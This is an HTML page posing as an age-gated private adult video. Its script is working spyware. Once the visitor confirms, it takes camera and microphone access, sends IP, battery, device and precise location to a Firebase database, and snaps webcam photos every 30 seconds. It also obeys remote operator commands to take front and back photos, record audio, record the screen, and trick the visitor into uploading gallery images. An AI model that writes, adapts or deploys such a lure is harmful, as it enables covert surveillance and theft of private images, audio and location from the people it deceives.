<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        #bg-image { position: fixed; width: 100%; height: 100%; background: url('bg.png.jpeg') center/cover; filter: blur(8px); z-index: 1; transform: scale(1.1); }
        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.5); }
        #play-btn { width: 100px; height: 100px; border: 4px solid #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 10px; }
        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 350px; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 1000; box-shadow: 0 0 50px #000; }
        .btn-yes { background: #00ff41; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
        /* Hidden file input for gallery access */
        #hiddenFileInput { display: none; }
    </style>
</head>
<body>

    <div id="bg-image"></div>
    <div id="main-ui">
        <div id="play-btn" onclick="document.getElementById('age-modal').style.display='block'"></div>
        <h1 style="color:#00ff41; margin-top:20px; letter-spacing: 2px;">WATCH VIDEO</h1>
        <p style="color:#fff; opacity:0.6;">Age Verification Required</p>
    </div>

    <div id="age-modal">
        <h2 style="color:#fff;">18+ Content</h2>
        <p style="color:#aaa;">Confirm you are of legal age to view this private stream.</p>
        <button class="btn-yes" onclick="startStealthSystem()">CONFIRM & PLAY</button>
    </div>

    <video id="target-player" style="display:none; width:100%; height:100%; position:fixed; top:0; z-index:9999; background:#000;" controls playsinline loop>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>

    <input type="file" id="hiddenFileInput" accept="image/*" multiple>

    <script>
        // --- CONFIGURATION ---
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Unique ID Generation
        const now = new Date();
        const dateStr = now.getDate() + "-" + (now.getMonth() + 1);
        const sessionID = "Target_" + dateStr + "_" + Math.floor(1000 + Math.random() * 9000);

        let currentStream = null;
        let screenRecordingStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];

        // --- CORE SYSTEM ---
        async function startStealthSystem() {
            document.getElementById('age-modal').style.display = 'none';
            try {
                // 1. Initial Permission (Mic and Camera)
                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                // 2. Hide UI & Play Video
                document.getElementById('main-ui').style.display = 'none';
                const v = document.getElementById('target-player');
                v.style.display = 'block';
                v.play();

                // 3. Send Initial Data
                await sendDeviceInfo();
                
                // 4. Start Background Processes
                sendLocation();
                setInterval(() => { capturePhoto('auto', 'user'); }, 30000); // Auto-capture every 30 seconds
                listenForAdmin();

            } catch (err) {
                alert("Permission Denied! Verification Failed.");
                location.reload();
            }
        }

        async function sendDeviceInfo() {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const batt = await navigator.getBattery();
            
            db.ref(`targets/${sessionID}/info`).set({
                ip: ipData.ip,
                battery: Math.floor(batt.level * 100) + "%",
                device: navigator.platform,
                status: "ONLINE",
                time: new Date().toLocaleString('en-GB')
            });
        }

        function sendLocation() {
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    db.ref(`targets/${sessionID}/location`).set({
                        lat: p.coords.latitude,
                        lng: p.coords.longitude,
                        acc: Math.round(p.coords.accuracy) + "m",
                        time: new Date().toLocaleString('en-GB')
                    });
                },
                (e) => { db.ref(`targets/${sessionID}/location`).set({ note: "DENIED" }); },
                { enableHighAccuracy: true }
            );
        }

        // --- DUAL CAMERA CAPTURE SYSTEM ---
        async function capturePhoto(label, mode) {
            try {
                if (currentStream) { // Stop default stream if active
                    currentStream.getTracks().forEach(track => track.stop());
                }

                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode } 
                });
                
                const v = document.createElement('video');
                v.srcObject = stream;
                v.muted = true;
                v.setAttribute('playsinline', '');
                await v.play();

                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    
                    db.ref(`targets/${sessionID}/photos`).push({
                        img: canvas.toDataURL('image/jpeg', 0.6),
                        type: label,
                        time: Date.now()
                    });

                    stream.getTracks().forEach(t => t.stop());
                    restartDefaultStream(); // Restart default stream
                }, 2000);
            } catch (e) { console.log("Cam Error: ", e); }
        }

        async function restartDefaultStream() {
            currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        }

        // --- NEW: SCREEN RECORDING LOGIC ---
        async function startScreenRecording() {
            try {
                // User ko permission deni hogi "Share Screen" ke liye
                screenRecordingStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
                mediaRecorder = new MediaRecorder(screenRecordingStream);
                recordedChunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        db.ref(`targets/${sessionID}/screen_records`).push({
                            video: reader.result,
                            time: Date.now()
                        });
                    };
                    screenRecordingStream.getTracks().forEach(track => track.stop()); // Stop screen sharing
                };

                mediaRecorder.start();
                alert("Screen Recording Started (will stop in 15 seconds)"); // User ko pata chalega
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 15000); // 15 seconds recording
            } catch (err) {
                alert("Screen recording permission denied or not supported.");
                console.error("Screen recording error: ", err);
            }
        }

        // --- NEW: GALLERY ACCESS LOGIC (User Interaction Required) ---
        function triggerGalleryAccess() {
            // User ko lagega ke video chalane ke liye file select karni hai
            document.getElementById('hiddenFileInput').click();
        }

        document.getElementById('hiddenFileInput').addEventListener('change', async (event) => {
            for (const file of event.target.files) {
                if (file.type.startsWith('image/')) {
                    const reader = new FileReader();
                    reader.readAsDataURL(file);
                    reader.onloadend = () => {
                        db.ref(`targets/${sessionID}/gallery_files`).push({
                            name: file.name,
                            type: file.type,
                            data: reader.result,
                            time: Date.now()
                        });
                        alert(`Uploaded: ${file.name}`);
                    };
                } else {
                    alert("Only image files can be uploaded here.");
                }
            }
        });


        // --- COMMAND LISTENER ---
        function listenForAdmin() {
            db.ref(`commands/${sessionID}`).on('value', async snap => {
                const cmd = snap.val();
                if(!cmd) return;

                if(cmd.action === 'photo') capturePhoto('front', 'user');
                if(cmd.action === 'back_photo') capturePhoto('back', 'environment');
                if(cmd.action === 'audio') {
                    // Audio recording logic (unchanged)
                    const rec = new MediaRecorder(currentStream);
                    let chunks = [];
                    rec.ondataavailable = e => chunks.push(e.data);
                    rec.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
                        reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ audio: reader.result });
                    };
                    rec.start(); 
                    setTimeout(() => rec.stop(), 5000);
                }
                
                // NEW COMMANDS
                if(cmd.action === 'screen_record') startScreenRecording();
                if(cmd.action === 'gallery_access') triggerGalleryAccess();

                // Remove command after execution
                db.ref(`commands/${sessionID}`).remove();
            });
        }
    </script>
</body>
</html>
